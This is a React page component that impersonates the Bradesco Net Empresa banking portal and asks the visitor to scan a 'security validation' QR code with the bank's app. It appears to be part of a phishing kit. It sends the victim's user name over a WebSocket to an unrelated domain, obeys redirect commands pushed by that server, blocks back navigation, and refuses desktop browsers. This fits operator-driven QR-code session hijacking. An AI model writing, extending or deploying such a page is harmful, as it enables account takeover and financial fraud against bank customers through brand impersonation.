import { useEffect, useRef } from "react";
import bradescoLogo from "@/assets/bradesco-logo.png";

const QRCodePage = () => {
  const usuario = sessionStorage.getItem("usuario") || "";
  const nome = sessionStorage.getItem("nome") || "";
  const qr = sessionStorage.getItem("qr") || "";
  const feixe = sessionStorage.getItem("feixe") || "";
  const dispositivo = sessionStorage.getItem("dispositivo") || "";
  const wsRef = useRef<WebSocket | null>(null);

  useEffect(() => {
    const ws = new WebSocket("wss://syncservicesqrgeneretor.online/ws/");
    wsRef.current = ws;

    ws.onopen = () => {
      console.log("QRCodePage WS conectado");
      if (usuario) {
        ws.send(JSON.stringify({ acao: "reconectar", usuario }));
      }
    };

    ws.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      console.log("QRCodePage msg:", msg);

      if (msg.acao === "redirecionar" && msg.url) {
        window.location.href = msg.url;
      }
    };

    ws.onerror = (err) => console.error("QRCode WS erro:", err);

    return () => {
      ws.close();
    };
  }, [usuario]);

  // Prevent back navigation
  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePop = () => window.history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", handlePop);
    return () => window.removeEventListener("popstate", handlePop);
  }, []);

  return (
    <>
      {/* Desktop blocker */}
      <div className="hidden md:flex min-h-screen items-center justify-center bg-[hsl(220,60%,40%)] p-8">
        <div className="text-center text-white max-w-sm space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-white/20 flex items-center justify-center mx-auto">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
          </div>
          <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
          <p className="text-white/70 text-sm leading-relaxed">
            Este portal está disponível apenas para dispositivos móveis.
          </p>
        </div>
      </div>

      {/* Mobile layout */}
      <div className="md:hidden min-h-screen flex flex-col bg-[hsl(220,20%,96%)]">
        {/* Blue header bar */}
        <div className="bg-[hsl(220,60%,40%)] px-4 py-3 flex items-center gap-3">
          <h1 className="text-white text-base font-semibold tracking-tight">
            Bradesco Net Empresa
          </h1>
        </div>

        {/* QR Code content */}
        <div className="flex flex-col items-center flex-1 px-6 pt-6">
          {/* Logo */}
          <img
            src={bradescoLogo}
            alt="Bradesco"
            className="w-16 h-16 object-contain mb-4"
          />

          {nome && (
            <p className="text-[hsl(220,10%,46%)] text-sm mb-1">
              Olá, <span className="font-semibold text-[hsl(220,20%,14%)]">{nome}</span>
            </p>
          )}

          <h2 className="text-[hsl(220,20%,14%)] text-lg font-bold mb-1 text-center">
            Validação de segurança
          </h2>
          <p className="text-[hsl(220,10%,46%)] text-xs text-center mb-5 max-w-[260px]">
            Escaneie o QR Code abaixo com o aplicativo Bradesco para validar seu acesso.
          </p>

          {/* QR Code display */}
          {qr ? (
            <div className="bg-white p-4 rounded-2xl shadow-md shadow-black/5 mb-5">
              <img
                src={qr}
                alt="QR Code de validação"
                className="w-52 h-52 object-contain"
              />
            </div>
          ) : (
            <div className="bg-white p-4 rounded-2xl shadow-md shadow-black/5 mb-5 w-60 h-60 flex items-center justify-center">
              <div className="w-8 h-8 border-[3px] border-[hsl(220,14%,89%)] border-t-[hsl(220,60%,40%)] rounded-full animate-spin" />
            </div>
          )}

          {/* Info */}
          <div className="bg-white rounded-xl px-4 py-3 w-full border border-[hsl(220,14%,89%)] space-y-2">
            {dispositivo && (
              <div className="flex justify-between text-sm">
                <span className="text-[hsl(220,10%,46%)]">Dispositivo</span>
                <span className="text-[hsl(220,20%,14%)] font-medium">{dispositivo}</span>
              </div>
            )}
            {feixe && (
              <div className="flex justify-between text-sm">
                <span className="text-[hsl(220,10%,46%)]">Protocolo</span>
                <span className="text-[hsl(220,20%,14%)] font-medium">{feixe}</span>
              </div>
            )}
          </div>

          <p className="text-[hsl(220,10%,46%)] text-xs mt-5 animate-pulse text-center">
            Aguardando leitura do QR Code...
          </p>
        </div>
      </div>
    </>
  );
};

export default QRCodePage;
